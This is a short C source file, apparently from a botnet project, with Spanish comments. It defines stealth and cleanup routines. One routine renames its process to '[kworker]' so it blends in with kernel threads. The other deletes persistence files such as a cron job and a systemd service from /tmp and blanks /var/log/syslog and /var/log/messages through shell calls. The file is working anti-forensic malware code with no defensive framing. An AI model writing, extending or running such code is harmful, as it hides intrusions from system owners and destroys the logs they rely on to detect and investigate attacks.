#include "../../include/botnet.h"

void hide_network_connections() {
    printf("[STEALTH] Hiding network connections...\n");

    // Cambiar el nombre del proceso en netstat
#ifdef __linux__
    prctl(PR_SET_NAME, "[kworker]", 0, 0, 0);
#endif
}

void remove_artifacts() {
    printf("[CLEANUP] Removing artifacts...\n");

    // Eliminar archivos temporales
    remove("/tmp/cronjob");
    remove("/tmp/system-service.service");

    // Limpiar logs
    system("echo '' > /var/log/syslog 2>/dev/null");
    system("echo '' > /var/log/messages 2>/dev/null");
}